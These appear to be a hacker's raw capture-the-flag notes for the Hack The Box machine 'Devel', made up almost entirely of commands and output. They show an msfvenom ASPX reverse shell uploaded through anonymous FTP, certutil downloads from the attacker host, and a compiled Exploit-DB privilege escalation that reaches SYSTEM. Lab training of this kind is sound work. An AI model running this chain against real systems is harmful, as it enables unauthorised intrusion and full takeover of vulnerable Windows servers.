@@ -1,0 +1,574 @@
+RECON
+root@kali:~/htb/devel# nmap -sC -sV -Pn  10.10.10.5
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| 03-18-17  01:06AM       <DIR>          aspnet_client
+| 03-17-17  04:37PM                  689 iisstart.htm
+|_03-17-17  04:37PM               184946 welcome.png
+| ftp-syst: 
+|_  SYST: Windows_NT
+80/tcp open  http    Microsoft IIS httpd 7.5
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: IIS7
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+
+ENUM
+
+
+CREATE REVERSE SHELL
+
+root@kali:~/htb/devel# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.8 LPORT=443 -a x86 --platform windows -f aspx -o shell.aspx
+No encoder or badchars specified, outputting raw payload
+Payload size: 324 bytes
+Final size of aspx file: 2693 bytes
+Saved as: shell.aspx
+
+UPLOAD ASPX REVERSE SHELL VIA FTP ANONYMOUS LOGIN
+
+root@kali:~/htb/devel# ftp 10.10.10.5 21
+Connected to 10.10.10.5.
+220 Microsoft FTP Service
+Name (10.10.10.5:root): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password:
+230 User logged in.
+Remote system type is Windows_NT.
+ftp> binary
+200 Type set to I.
+ftp> put shell.aspx
+local: shell.aspx remote: shell.aspx
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+226 Transfer complete.
+2693 bytes sent in 0.00 secs (52.4132 MB/s)
+ftp> dir
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+03-18-17  01:06AM       <DIR>          aspnet_client
+03-17-17  04:37PM                  689 iisstart.htm
+11-04-20  07:41AM                 2693 shell.aspx
+03-17-17  04:37PM               184946 welcome.png
+226 Transfer complete.
+
+OR VIEW SHELL IN BROWSER
+ftp://anonymous:anonymous@10.10.10.5
+
+CHECK LOCATION OF SHELL UPLOAD IN IIS WEB DIRECTORY
+root@kali:~/dirsearch# python3 dirsearch.py -e asp,aspx,html,htm,js -u http://10.10.10.5 -X php,jsp,jspx
+
+  _|. _ _  _  _  _ _|_    v0.4.0
+ (_||| _) (/_(_|| (_| )
+
+Extensions: asp, aspx, html, htm, js | HTTP method: GET | Threads: 20 | Wordlist size: 8438
+
+Error Log: /root/dirsearch/logs/errors-20-10-31_17-49-58.log
+
+Target: http://10.10.10.5/
+
+Output File: /root/dirsearch/reports/10.10.10.5/_20-10-31_17-49-58.txt
+
+[17:49:58] Starting: 
+[17:49:59] 403 -  312B  - //%2e%2e//google.com
+[17:50:07] 403 -    2KB - //Trace.axd
+[17:50:07] 500 -    3KB - //WebResource.axd?d=LER8t9aS
+[17:50:11] 301 -  155B  - //aspnet_client  ->  http://10.10.10.5/aspnet_client/
+[17:50:11] 403 -    1KB - //aspnet_client/
+[17:50:20] 200 -    0B  - //shell.aspx
+
+Task Completed
+
+
+TRIGGER SHELL
+http://10.10.10.5//shell.aspx
+
+GET REVERSE SHELL
+root@kali:~/htb/devel# nc -lvp 443
+listening on [any] 443 ...
+10.10.10.5: inverse host lookup failed: Unknown host
+connect to [10.10.14.8] from (UNKNOWN) [10.10.10.5] 49161
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+c:\windows\system32\inetsrv>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeShutdownPrivilege           Shut down the system                      Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeUndockPrivilege             Remove computer from docking station      Disabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+SeTimeZonePrivilege           Change the time zone                      Disabled
+
+C:\Users>whoami
+whoami
+iis apppool\web
+
+IDENITY MACHINE OS AND ARCHITECTURE
+C:\Windows\Temp>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeShutdownPrivilege           Shut down the system                      Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeUndockPrivilege             Remove computer from docking station      Disabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+SeTimeZonePrivilege           Change the time zone                      Disabled
+
+C:\Windows\Temp>systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+OS Name:                   Microsoft Windows 7 Enterprise 
+OS Version:                6.1.7600 N/A Build 7600
+
+C:\Windows\Temp>wmic OS get OSArchitecture
+wmic OS get OSArchitecture
+OSArchitecture  
+32-bit          
+
+certutil.exe -urlcache -split -f http://10.10.14.8/windows-privesc-check2.exe windows-privesc-check2.exe
+
+root@kali:~/htb/devel# nc -lvp 443
+listening on [any] 443 ...
+10.10.10.5: inverse host lookup failed: Unknown host
+connect to [10.10.14.8] from (UNKNOWN) [10.10.10.5] 49160
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+c:\windows\system32\inetsrv>cd %tmp%
+cd %tmp%
+
+C:\Windows\Temp>
+
+Check for Privilege Escalation Vectors as a Non-administrative User
+
+C:\Windows\Temp>certutil.exe -urlcache -split -f http://10.10.14.8/windows-privesc-check2.exe windows-privesc-check2.exe
+certutil.exe -urlcache -split -f http://10.10.14.8/windows-privesc-check2.exe windows-privesc-check2.exe
+****  Online  ****
+  000000  ...
+  7235d6
+CertUtil: -URLCache command FAILED: 0x800708ca (WIN32: 2250)
+CertUtil: This network connection does not exist.
+
+C:\Windows\Temp>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 8620-71F1
+
+ Directory of C:\Windows\Temp
+
+04/11/2020  11:02 ��    <DIR>          .
+04/11/2020  11:02 ��    <DIR>          ..
+17/03/2017  01:10 ��                 0 DMI20C8.tmp
+28/12/2017  01:44 ��                 0 DMI4069.tmp
+17/03/2017  05:42 ��             3.942 MpCmdRun.log
+17/03/2017  04:32 ��             5.194 MpSigStub.log
+18/03/2017  01:04 ��    <DIR>          rad11098.tmp
+18/03/2017  01:06 ��    <DIR>          rad18A66.tmp
+18/03/2017  01:06 ��    <DIR>          rad3ED74.tmp
+18/03/2017  01:06 ��    <DIR>          rad5167A.tmp
+18/03/2017  01:02 ��    <DIR>          rad578E0.tmp
+18/03/2017  01:02 ��    <DIR>          rad87630.tmp
+18/03/2017  01:07 ��    <DIR>          radB60EF.tmp
+18/03/2017  01:02 ��    <DIR>          radB7E46.tmp
+18/03/2017  12:58 ��    <DIR>          radC91EC.tmp
+18/03/2017  01:02 ��    <DIR>          radCC0AF.tmp
+18/03/2017  01:00 ��    <DIR>          radCFF96.tmp
+17/03/2017  01:12 ��           180.224 TS_91C4.tmp
+17/03/2017  01:12 ��           196.608 TS_952F.tmp
+17/03/2017  01:12 ��           360.448 TS_95BC.tmp
+17/03/2017  01:12 ��           638.976 TS_96C6.tmp
+17/03/2017  01:12 ��            98.304 TS_989B.tmp
+17/03/2017  01:12 ��            98.304 TS_9909.tmp
+17/03/2017  01:12 ��           409.600 TS_99A6.tmp
+17/03/2017  01:12 ��           180.224 TS_A0E8.tmp
+17/03/2017  01:12 ��           114.688 TS_A57B.tmp
+28/12/2017  01:50 ��    <DIR>          vmware-SYSTEM
+04/11/2020  11:39 ��            31.524 vmware-vmsvc.log
+28/12/2017  02:49 ��             6.807 vmware-vmusr.log
+04/11/2020  11:39 ��               470 vmware-vmvss.log
+04/11/2020  11:02 ��         7.484.886 windows-privesc-check2.exe
+              17 File(s)      9.810.199 bytes
+              14 Dir(s)  24.473.247.744 bytes free
+
+C:\Windows\Temp>windows-privesc-check2.exe
+windows-privesc-check2.exe
+windows-privesc-check v2.0svn198 (http://pentestmonkey.net/windows-privesc-check)
+
+[E] Specify mode using --dump, --audit, --dumptab or --pyshell.  -h for help.
+
+C:\Windows\Temp>windows-privesc-check2.exe --dump
+windows-privesc-check2.exe --dump
+windows-privesc-check v2.0svn198 (http://pentestmonkey.net/windows-privesc-check)
+
+[E] Specify something to look at.  At least one of: -a, -j, -O, -t, -D, -E, -e, -H, -T, -L , -S, -k, -I, -U, -s, -d, -P, -r, -R, -U, -G, -M.  -h for help.
+
+C:\Windows\Temp>windows-privesc-check2.exe --audit -a -o wpc-report
+windows-privesc-check2.exe --audit -a -o wpc-report
+
+C:\Windows\Temp>windows-privesc-check2.exe --dump
+windows-privesc-check2.exe --dump
+windows-privesc-check v2.0svn198 (http://pentestmonkey.net/windows-privesc-check)
+
+[E] Specify something to look at.  At least one of: -a, -j, -O, -t, -D, -E, -e, -H, -T, -L , -S, -k, -I, -U, -s, -d, -P, -r, -R, -U, -G, -M.  -h for help.
+
+C:\Windows\Temp>windows-privesc-check2.exe --audit -a -o wpc-report
+windows-privesc-check2.exe --audit -a -o wpc-report
+
+windows-privesc-check v2.0svn198 (http://pentestmonkey.net/windows-privesc-check)
+
+[i] TSUserEnabled registry value is 0. Excluding TERMINAL SERVER USER
+
+Considering these users to be trusted:
+* BUILTIN\Power Users
+* BUILTIN\Administrators
+* NT SERVICE\TrustedInstaller
+* NT AUTHORITY\SYSTEM
+
+[i] Running as current user.  No logon creds supplied (-u, -D, -p).
+
+[+] Runtime Options Dump
+ mode: audit
+ do_all: True
+ do_allfiles: False
+ do_appendices: True
+ do_drivers: False
+ do_drives: False
+ do_errors: False
+ do_eventlogs: False
+ do_groups: False
+ do_installed_software: False
+ do_loggedin: False
+ do_nt_objects: False
+ do_paths: False
+ do_processes: False
+ do_program_files: False
+ do_reg_keys: False
+ do_registry: False
+ do_scheduled_tasks: False
+ do_services: False
+ do_shares: False
+ do_unreadable_if: True
+ do_users: False
+ exploitable_by_list: []
+ ignore_principal_file: False
+ ignore_principal_list: ['BUILTIN\\Administrators', 'NT SERVICE\\TrustedInstaller', 'NT AUTHORITY\\SYSTEM']
+ ignorenoone: False
+ patchfile: None
+ privesc_mode: report_untrusted
+ remote_domain: None
+ remote_host: None
+ remote_pass: None
+ remote_user: None
+ report_file_stem: wpc-report
+ verbose: False
+
+============ Starting Audit at 2020-11-04 23:04:00 ============
+
+[+] Running: audit_misc_checks
+ [+] Checks completed
+
+[+] Running: audit_paths
+[-] Checking system path
+[-] Checking current user's path
+WARNING: Can't get security descriptor for file: 
+WARNING: Can't get security descriptor for file: \pagefile.sys
+ [+] Checks completed
+
+[+] Running: audit_eventlogs
+WARNING: Can't get security descriptor for file: C:\Windows\system32\winevt\Logs\Application.evtx
+WARNING: Can't get security descriptor for file: C:\Windows\system32\winevt\Logs\Application.evtx
+WARNING: Can't get security descriptor for file: C:\Windows\system32\winevt\Logs\Application.evtx
+WARNING: Can't get security descriptor for file: C:\Windows\system32\winevt\logs\HardwareEvents.evtx
+WARNING: Can't get security descriptor for file: C:\Windows\system32\winevt\logs\HardwareEvents.evtx
+WARNING: Can't get security descriptor for file: C:\Windows\system32\winevt\logs\HardwareEvents.evtx
+WARNING: Can't get security descriptor for file: C:\Windows\system32\winevt\Logs\System.evtx
+WARNING: Can't get security descriptor for file: C:\Windows\system32\winevt\Logs\System.evtx
+WARNING: Can't get security descriptor for file: C:\Windows\system32\winevt\Logs\System.evtx
+ [+] Checks completed
+
+[+] Running: audit_shares
+[E] NetShareGetInfo: Access is denied.
+[E] NetShareGetInfo: Access is denied.
+[E] NetShareGetInfo: Access is denied.
+ [+] Checks completed
+
+[+] Running: audit_patches
+[E] Can't open patch data file: None
+ [+] Checks completed
+
+[+] Running: audit_loggedin
+
+[+] Logged in users:
+ [+] Checks completed
+
+[+] Running: audit_services
+[E] Errors occurred but were supressed.  Some checks might have been missed.  Probably a bug.
+ [+] Checks completed
+
+[+] Running: audit_drivers
+ [+] Checks completed
+
+[+] Running: audit_drives
+ [+] Checks completed
+
+[+] Running: audit_processes
+ [+] Checks completed
+
+[+] Running: audit_program_files
+ [+] Checks completed
+
+[+] Running: audit_registry
+[W] is_replaceable called for non-existent file None
+[-] Walking registry (very slow: probably 15 mins - 1 hour)
+ [+] Checks completed
+
+[+] Running: audit_scheduled_tasks
+------ \Microsoft\Windows\Autochk\Proxy -------
+runas user: S-1-5-19
+exec command: %windir%\system32\rundll32.exe
+exec command2: C:\Windows\system32\rundll32.exe
+exec args: /d acproxy.dll,PerformAutochkOperations
+
+------ \Microsoft\Windows\Defrag\ScheduledDefrag -------
+runas user: S-1-5-18
+exec command: %windir%\system32\defrag.exe
+exec command2: C:\Windows\system32\defrag.exe
+exec args: -c
+
+------ \Microsoft\Windows\Location\Notifications -------
+runas user: S-1-5-11
+exec command: %windir%\System32\LocationNotifications.exe
+exec command2: C:\Windows\System32\LocationNotifications.exe
+exec args: <none>
+
+------ \Microsoft\Windows\Media Center\RecordingRestart -------
+runas user: S-1-5-20
+exec command: %SystemRoot%\ehome\ehrec
+exec command2: C:\Windows\ehome\ehrec
+[W] is_replaceable called for non-existent file C:\Windows\ehome\ehrec
+exec args: /RestartRecording
+
+------ \Microsoft\Windows\MUI\LPRemove -------
+runas user: S-1-5-18
+exec command: %windir%\system32\lpremove.exe
+exec command2: C:\Windows\system32\lpremove.exe
+exec args: <none>
+
+------ \Microsoft\Windows\SystemRestore\SR -------
+runas user: S-1-5-18
+exec command: %windir%\system32\rundll32.exe
+exec command2: C:\Windows\system32\rundll32.exe
+exec args: /d srrstr.dll,ExecuteScheduledSPPCreation
+
+------ \Microsoft\Windows\Tcpip\IpAddressConflict1 -------
+runas user: S-1-5-32-545
+exec command: %windir%\system32\rundll32.exe
+exec command2: C:\Windows\system32\rundll32.exe
+exec args: ndfapi.dll,NdfRunDllDuplicateIPOffendingSystem
+
+------ \Microsoft\Windows\Tcpip\IpAddressConflict2 -------
+runas user: S-1-5-32-545
+exec command: %windir%\system32\rundll32.exe
+exec command2: C:\Windows\system32\rundll32.exe
+exec args: ndfapi.dll,NdfRunDllDuplicateIPDefendingSystem
+
+------ \Microsoft\Windows\Time Synchronization\SynchronizeTime -------
+runas user: S-1-5-19
+exec command: %windir%\system32\sc.exe
+exec command2: C:\Windows\system32\sc.exe
+exec args: start w32time task_started
+
+------ \Microsoft\Windows\Windows Media Sharing\UpdateLibrary -------
+runas user: S-1-5-11
+exec command: "%ProgramFiles%\Windows Media Player\wmpnscfg.exe"
+exec command2: "C:\Program Files\Windows Media Player\wmpnscfg.exe"
+[W] is_replaceable called for non-existent file "C:\Program Files\Windows Media Player\wmpnscfg.exe"
+exec args: <none>
+
+------ \Microsoft\Windows\WindowsBackup\ConfigNotification -------
+runas user: S-1-5-19
+exec command: %systemroot%\System32\sdclt.exe
+exec command2: C:\Windows\System32\sdclt.exe
+exec args: /CONFIGNOTIFICATION
+
+------ \Microsoft\Windows Defender\MP Scheduled Scan -------
+runas user: S-1-5-18
+exec command: c:\program files\windows defender\MpCmdRun.exe
+exec command2: c:\program files\windows defender\MpCmdRun.exe
+exec args: Scan -ScheduleJob -WinTask -RestrictPrivilegesScan
+
+ [+] Checks completed
+
+[+] Running: audit_reg_keys
+ [+] Checks completed
+
+[+] Running: audit_users
+ [+] Checks completed
+
+[+] Running: audit_nt_objects
+ [+] Checks completed
+
+[+] Running: audit_groups
+ [+] Checks completed
+
+[+] Running: audit_installed_software
+[+] Checking installed software
+ [+] Checks completed
+
+============ Audit Complete at 2020-11-04 23:13:38 ============
+
+[+] Runtime: 578.0 seconds
+
+[+] Saving report file wpc-report.xml
+[+] Saving report file wpc-report.txt
+[+] Saving report file wpc-report.html
+
+
+SEARCH EXPLOIT BASED ON OS Version: 6.1.7600 N/A Build 7600
+https://www.exploit-db.com/exploits/40564
+
+COMPILE EXPLOIT
+root@kali:~/htb/devel# locate 40564
+/usr/share/exploitdb/exploits/windows_x86/local/40564.c
+root@kali:~/htb/devel# cp /usr/share/exploitdb/exploits/windows_x86/local/40564.c .
+root@kali:~/htb/devel# i686-w64-mingw32-gcc 40564.c -o 40564.exe -lws2_32
+
+UPLOAD TO DEVEL
+C:\Windows\Temp>certutil.exe -urlcache -split -f http://10.10.14.8/40564.exe 40564.exe
+certutil.exe -urlcache -split -f http://10.10.14.8/40564.exe 40564.exe
+****  Online  ****
+  000000  ...
+  05aa81
+CertUtil: -URLCache command FAILED: 0x800708ca (WIN32: 2250)
+CertUtil: This network connection does not exist.
+
+C:\Windows\Temp>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 8620-71F1
+
+ Directory of C:\Windows\Temp
+
+05/11/2020  01:39 ��    <DIR>          .
+05/11/2020  01:39 ��    <DIR>          ..
+05/11/2020  01:39 ��           371.329 40564.exe
+17/03/2017  01:10 ��                 0 DMI20C8.tmp
+28/12/2017  01:44 ��                 0 DMI4069.tmp
+05/11/2020  12:36 ��            16.974 jaws-enum.ps1
+17/03/2017  05:42 ��             3.942 MpCmdRun.log
+17/03/2017  04:32 ��             5.194 MpSigStub.log
+18/03/2017  01:04 ��    <DIR>          rad11098.tmp
+18/03/2017  01:06 ��    <DIR>          rad18A66.tmp
+18/03/2017  01:06 ��    <DIR>          rad3ED74.tmp
+18/03/2017  01:06 ��    <DIR>          rad5167A.tmp
+18/03/2017  01:02 ��    <DIR>          rad578E0.tmp
+18/03/2017  01:02 ��    <DIR>          rad87630.tmp
+18/03/2017  01:07 ��    <DIR>          radB60EF.tmp
+18/03/2017  01:02 ��    <DIR>          radB7E46.tmp
+18/03/2017  12:58 ��    <DIR>          radC91EC.tmp
+18/03/2017  01:02 ��    <DIR>          radCC0AF.tmp
+18/03/2017  01:00 ��    <DIR>          radCFF96.tmp
+17/03/2017  01:12 ��           180.224 TS_91C4.tmp
+17/03/2017  01:12 ��           196.608 TS_952F.tmp
+17/03/2017  01:12 ��           360.448 TS_95BC.tmp
+17/03/2017  01:12 ��           638.976 TS_96C6.tmp
+17/03/2017  01:12 ��            98.304 TS_989B.tmp
+17/03/2017  01:12 ��            98.304 TS_9909.tmp
+17/03/2017  01:12 ��           409.600 TS_99A6.tmp
+17/03/2017  01:12 ��           180.224 TS_A0E8.tmp
+17/03/2017  01:12 ��           114.688 TS_A57B.tmp
+28/12/2017  01:50 ��    <DIR>          vmware-SYSTEM
+05/11/2020  01:07 ��            32.774 vmware-vmsvc.log
+28/12/2017  02:49 ��             6.807 vmware-vmusr.log
+04/11/2020  11:39 ��               470 vmware-vmvss.log
+04/11/2020  11:40 ��            69.175 windows-exploit-suggester.py
+04/11/2020  11:02 ��         7.484.886 windows-privesc-check2.exe
+04/11/2020  11:38 ��           472.064 winPEAS.exe
+04/11/2020  11:13 ��           266.918 wpc-report.html
+04/11/2020  11:13 ��            73.489 wpc-report.txt
+04/11/2020  11:13 ��           203.944 wpc-report.xml
+              25 File(s)     11.656.671 bytes
+              14 Dir(s)  24.414.916.608 bytes free
+
+C:\Windows\Temp>40564.exe
+40564.exe
+
+GET SYSTEM SHELL
+c:\Windows\System32>whoami     
+whoami
+nt authority\system
+
+c:\Windows\System32>dir C:\Users\
+dir C:\Users\
+ Volume in drive C has no label.
+ Volume Serial Number is 8620-71F1
+
+ Directory of C:\Users
+
+18/03/2017  01:16 ��    <DIR>          .
+18/03/2017  01:16 ��    <DIR>          ..
+18/03/2017  01:16 ��    <DIR>          Administrator
+17/03/2017  04:17 ��    <DIR>          babis
+18/03/2017  01:06 ��    <DIR>          Classic .NET AppPool
+14/07/2009  09:20 ��    <DIR>          Public
+               0 File(s)              0 bytes
+               6 Dir(s)  24.414.879.744 bytes free
+
+GET USER FLAG
+c:\Windows\System32>dir C:\Users\babis\Desktop
+dir C:\Users\babis\Desktop
+ Volume in drive C has no label.
+ Volume Serial Number is 8620-71F1
+
+ Directory of C:\Users\babis\Desktop
+
+18/03/2017  01:14 ��    <DIR>          .
+18/03/2017  01:14 ��    <DIR>          ..
+18/03/2017  01:18 ��                32 user.txt.txt
+               1 File(s)             32 bytes
+               2 Dir(s)  24.414.879.744 bytes free
+
+c:\Windows\System32>type C:\Users\babis\Desktop\user.txt.txt
+type C:\Users\babis\Desktop\user.txt.txt
+############################
+
+GET ROOT FLAG
+c:\Windows\System32>dir C:\Users\Administrator\Desktop
+dir C:\Users\Administrator\Desktop
+ Volume in drive C has no label.
+ Volume Serial Number is 8620-71F1
+
+ Directory of C:\Users\Administrator\Desktop
+
+18/03/2017  01:17 ��    <DIR>          .
+18/03/2017  01:17 ��    <DIR>          ..
+18/03/2017  01:17 ��                32 root.txt.txt
+               1 File(s)             32 bytes
+               2 Dir(s)  24.414.879.744 bytes free
+
+c:\Windows\System32>type C:\Users\Administrator\Desktop\root.txt.txt
+type C:\Users\Administrator\Desktop\root.txt.txt
+#######################
+
+
